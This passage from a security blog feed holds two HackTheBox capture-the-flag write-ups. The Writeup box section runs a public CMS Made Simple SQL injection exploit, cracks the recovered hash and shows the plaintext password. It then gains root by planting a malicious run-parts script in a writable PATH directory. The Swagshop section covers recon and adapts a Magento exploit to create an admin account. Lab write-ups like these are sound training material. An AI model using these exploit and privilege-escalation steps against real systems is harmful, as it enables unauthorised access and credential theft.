&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.25 ((Debian))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Sep 22 16:08:43 2019 -- 1 IP address (1 host up) scanned in 15.20 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web-getting-user"&gt;Web, getting user&lt;/h1&gt;
&lt;p&gt;The homepage of this website is ugly and say that there is nothing there yet.
We take a look to &lt;code&gt;robots.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#              __&lt;/span&gt;
&lt;span class="code-line"&gt;#      _(\    |@@|&lt;/span&gt;
&lt;span class="code-line"&gt;#     (__/\__ \--/ __&lt;/span&gt;
&lt;span class="code-line"&gt;#        \___|----|  |   __&lt;/span&gt;
&lt;span class="code-line"&gt;#            \ }{ /\ )_ / _\&lt;/span&gt;
&lt;span class="code-line"&gt;#            /\__/\ \__O (__&lt;/span&gt;
&lt;span class="code-line"&gt;#           (--/\--)    \__/&lt;/span&gt;
&lt;span class="code-line"&gt;#           _)(  )(_&lt;/span&gt;
&lt;span class="code-line"&gt;#          `---&amp;#39;&amp;#39;---`&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Disallow access to the blog until content is finished.&lt;/span&gt;
&lt;span class="code-line"&gt;User-agent: * &lt;/span&gt;
&lt;span class="code-line"&gt;Disallow: /writeup/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's take a look at &lt;code&gt;/writeup/&lt;/code&gt;! We have there another website. When looking at
the page source code we notice the use of "CMS Made Simple" a CMS with a few
vulnerabilities.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;en_US&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Home - writeup&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;base&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://10.10.10.138/writeup/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Generator&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/html; charset=utf-8&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's search for exploits, a few of them are available:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# searchsploit &amp;#39;made simple&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt; Exploit Title                                                                        |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                                                                      | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | exploits/php/remote/46627.rb&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 0.10 - &amp;#39;Lang.php&amp;#39; Remote File Inclusion                               | exploits/php/webapps/26217.html&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 0.10 - &amp;#39;index.php&amp;#39; Cross-Site Scripting                               | exploits/php/webapps/26298.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.0.2 - &amp;#39;SearchInput&amp;#39; Cross-Site Scripting                            | exploits/php/webapps/29272.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.0.5 - &amp;#39;Stylesheet.php&amp;#39; SQL Injection                                | exploits/php/webapps/29941.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | exploits/php/webapps/32668.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | exploits/php/webapps/43889.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.2 - Remote Code Execution                                           | exploits/php/webapps/4442.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | exploits/php/webapps/4810.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | exploits/php/webapps/5600.php&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.4.1 - Local File Inclusion                                          | exploits/php/webapps/7285.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.6.2 - Local File Disclosure                                         | exploits/php/webapps/9407.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | exploits/php/webapps/33643.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/11424.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | exploits/php/webapps/12009.html&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.8 - &amp;#39;default_cms_lang&amp;#39; Local File Inclusion                         | exploits/php/webapps/34299.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | exploits/php/webapps/34068.html&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/41997.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 2.1.6 - Remote Code Execution                                         | exploits/php/webapps/44192.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/44976.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/45793.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple &amp;lt; 1.12.1 / &amp;lt; 2.1.3 - Web Server Cache Poisoning                       | exploits/php/webapps/39760.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple &amp;lt; 2.2.10 - SQL Injection                                              | exploits/php/webapps/46635.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | exploits/php/webapps/34300.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | exploits/php/webapps/34298.py&lt;/span&gt;
&lt;span class="code-line"&gt;CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | exploits/php/webapps/46546.py&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we are not authenticated, The one that interest us is "CMS Made Simple &amp;lt;
2.2.10 - SQL Injection (exploits/php/webapps/46635.py). We run the exploit
(admire the beauty of the display). We then get a username, an email, a password
salt and a password hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python 46635.py -u http://10.10.10.138/writeup&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Salt for password found: 5a599ef579066807&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Username found: jkr&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Email found: jkr@writeup.htb&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Password found: 62def4866937f08cc13bab43bb14e6f7&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The exploit also allow to crack the password using a dictionary. We run
"rockyou" against it and found jkr password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# python 46635.py --crack -w ./rockyou.txt -u http://10.10.10.138/writeup&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Salt for password found: 5a599ef579066807&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Username found: jkr&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Email found: jkr@writeup.htb&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Password found: 62def4866937f08cc13bab43bb14e6f7&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Password cracked: raykayjay9&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With this password we are able to connect to the box using SSH and get the user
password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh jkr@10.10.10.138&lt;/span&gt;
&lt;span class="code-line"&gt;jkr@10.10.10.138&amp;#39;s password: &lt;/span&gt;
&lt;span class="code-line"&gt;Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The programs included with the Devuan GNU/Linux system are free software;&lt;/span&gt;
&lt;span class="code-line"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
&lt;span class="code-line"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
&lt;span class="code-line"&gt;permitted by applicable law.&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Sun Sep 22 12:31:00 2019 from 10.10.14.237&lt;/span&gt;
&lt;span class="code-line"&gt;jkr@writeup:~$ cat user.txt &lt;/span&gt;
&lt;span class="code-line"&gt;d4e493&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We enumerate the box without a lot of success. A quick read of the box forum
recommend to run &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; on the box. We
discover that a script is run every time an user connect with SSH.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;2019/09/25 07:39:49 CMD: UID=0    PID=4352   | sshd: [accepted]&lt;/span&gt;
&lt;span class="code-line"&gt;2019/09/25 07:39:49 CMD: UID=0    PID=4353   | sshd: [accepted]  &lt;/span&gt;
&lt;span class="code-line"&gt;2019/09/25 07:40:01 CMD: UID=0    PID=4354   | sshd: jkr [priv]  &lt;/span&gt;
&lt;span class="code-line"&gt;2019/09/25 07:40:01 CMD: UID=0    PID=4355   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &amp;gt; /run/motd.dynamic.new &lt;/span&gt;
&lt;span class="code-line"&gt;2019/09/25 07:40:01 CMD: UID=0    PID=4356   | run-parts --lsbsysinit /etc/update-motd.d&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The PATH is fixed by the command line and there is no &lt;code&gt;run-parts&lt;/code&gt; binary in the
first folder &lt;code&gt;/usr/local/sbin&lt;/code&gt;. Moreover this folder is writable. Therefore
we write a simple file &lt;code&gt;/usr/local/sbin/run-parts&lt;/code&gt; and give it the execution
permission:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jkr@writeup:~$ vim /usr/local/sbin/run-parts&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;cat /root/root.txt &amp;gt; /tmp/lool/b&lt;/span&gt;
&lt;span class="code-line"&gt;rm /tmp/lool/b&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We create a directory in &lt;code&gt;/tmp/&lt;/code&gt; and write the &lt;code&gt;b&lt;/code&gt; file. At the same time be
connect by SSH with the jkr user. We get the root flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jkr@writeup:~$ mkdir /tmp/lool/&lt;/span&gt;
&lt;span class="code-line"&gt;jkr@writeup:~$ echo a &amp;gt; /tmp/lool/b&lt;/span&gt;
&lt;span class="code-line"&gt;jkr@writeup:~$ tail -f /tmp/lool/b&lt;/span&gt;
&lt;span class="code-line"&gt;a&lt;/span&gt;
&lt;span class="code-line"&gt;tail: /tmp/lool/b: file truncated&lt;/span&gt;
&lt;span class="code-line"&gt;eeba4&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The user step implied only to use a know exploit without any change. The
privilege escalation was really interesting as I didn't use
&lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; before.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="exploit"></category><category term="linux"></category></entry><entry><title>HTB: Swagshop</title><link href="https://maggick.fr/2019/09/htb-swagshop.html" rel="alternate"></link><published>2019-09-29T09:00:00+02:00</published><updated>2019-09-29T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-09-29:/2019/09/htb-swagshop.html</id><summary type="html">&lt;p&gt;&lt;img alt="Swagshop Card" class="align-left" src="/media/2019.09/swagshop_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/188"&gt;Swagshop&lt;/a&gt;
This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
wrong direction and finally found a path to root this magento box.&lt;/p&gt;
&lt;p&gt;This article presents the different methods which failed on the box as well as
the solution to root it.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.09/swagshop_card.png" alt="Swagshop Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/188"&gt;Swagshop&lt;/a&gt;
This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
wrong direction and finally found a path to root this magento box.&lt;/p&gt;
&lt;p&gt;This article presents the different methods which failed on the box as well as
the solution to root it.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#nmap"&gt;nmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#getting-admin"&gt;Getting Admin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-rce-way"&gt;The RCE way&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#to-the-user-flag"&gt;To the user flag&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#lets-get-root"&gt;let's get root&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#reverse-shell-way"&gt;Reverse shell way&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Sep 17 14:15:38 2019 as: nmap -oA 10.10.10.140 -sS 10.10.10.140&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.140&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.019s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 998 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Tue Sep 17 14:15:43 2019 -- 1 IP address (1 host up) scanned in 4.94 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;As there is only an SSH and a HTTP port, we continue our recon on the web part.&lt;/p&gt;
&lt;p&gt;When accessing the website we can observe a Magento website.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Swag shop homepage" src="/media/2019.09/swagshop_3.png"&gt;&lt;/p&gt;
&lt;p&gt;Let us try a dirb:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# dirb http://10.10.10.140/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Tue Sep 17 14:27:20 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.140/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.140/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/app/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/errors/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/includes/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.140/index.php (CODE:200|SIZE:16097)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/js/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/lib/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/media/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/pkginfo/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.140/server-status (CODE:403|SIZE:300)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/shell/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/skin/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.140/var/&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that there is a lot of directories accessible directly.
We can gather a lot of information from them, for instance the release notes
gives us some information by the version of the application:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Swag shop release note" src="/media/2019.09/swagshop_2.png"&gt;&lt;/p&gt;
&lt;p&gt;An admin panel is also accessible on the application:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Swag shop admin panel" src="/media/2019.09/swagshop_4.png"&gt;&lt;/p&gt;
&lt;p&gt;Let us see what CVE are available for magento. Our version is 1.7.0.2.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# searchsploit magento&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt; Exploit Title                                                                                                |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                                                                                              | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Magento 1.2 - &amp;#39;/app/code/core/Mage/Admin/Model/Session.php?login[&amp;#39;Username&amp;#39;]&amp;#39; Cross-Site Scripting            | exploits/php/webapps/32808.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento 1.2 - &amp;#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&amp;#39; Cross-Site Scripting      | exploits/php/webapps/32809.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento 1.2 - &amp;#39;downloader/index.php&amp;#39; Cross-Site Scripting                                                     | exploits/php/webapps/32810.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento &amp;lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                | exploits/php/webapps/39838.php&lt;/span&gt;
&lt;span class="code-line"&gt;Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                                  | exploits/php/webapps/37811.py&lt;/span&gt;
&lt;span class="code-line"&gt;Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                        | exploits/php/webapps/35996.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                   | exploits/php/webapps/35052.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento eCommerce - Local File Disclosure                                                                     | exploits/php/webapps/19793.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Magento eCommerce - Remote Code Execution                                                                     | exploits/xml/webapps/37977.py&lt;/span&gt;
&lt;span class="code-line"&gt;eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                  | exploits/php/webapps/38573.txt&lt;/span&gt;
&lt;span class="code-line"&gt;eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                       | exploits/php/webapps/38651.txt&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------------------------------------- ----------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our application is vulnerable to two interesting exploit:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Magento eCommerce - Remote Code Execution (exploits/xml/webapps/37977.py)&lt;/li&gt;
&lt;li&gt;Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="getting-admin"&gt;Getting Admin&lt;/h2&gt;
&lt;p&gt;The second exploit allow to create an admin account on the application.&lt;/p&gt;
&lt;p&gt;But the exploit's script use a wrong URL. We add "/index.php/admin/" to the
target URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;target_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/index.php/admin/Cms_Wysiwyg/directive/index/&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This will create an administrator account named "forme" with the same password.
We can then login to the admin panel and access the full magento framework.&lt;/p&gt;
&lt;p&gt;&lt;img alt="magenta admin panel" src="/media/2019.09/swagshop_1.png"&gt;&lt;/p&gt;
&lt;h2 id="the-rce-way"&gt;The RCE way&lt;/h2&gt;
&lt;h3 id="to-the-user-flag"&gt;To the user flag&lt;/h3&gt;
&lt;p&gt;From there a few possibility will allow us to execute code on the application:&lt;/p&gt;
&lt;p&gt;The first one is to upload a magento extension using the download. A blog
post from jvoisin explain how to write this "simple" backdoor:
&lt;a href="https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html"&gt;Writing a simple extension/backdoor for Magento&lt;/a&gt;.
Nevertheless, the downloader is disabled a return a 404 error.&lt;/p&gt;
&lt;p&gt;The second one implies to create a new product and exploit a phtml page to
execute code on the server. An article blog describe the process
&lt;a href="https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/"&gt;Sec Team Blog&lt;/a&gt;.
Once more this method does not seems to work. Maybe our Magenton version is too
old an the vulnerability is not introduce on the application yet.&lt;/p&gt;
&lt;p&gt;An other on is to exploit the "froghopper" attack described in a
&lt;a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper"&gt;forgenix blog post&lt;/a&gt;.
Again, the uploaded code was not executed on the server&lt;/p&gt;
&lt;p&gt;The last option is to use the other exploit that was listed with searchsploit:
Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)&lt;/p&gt;
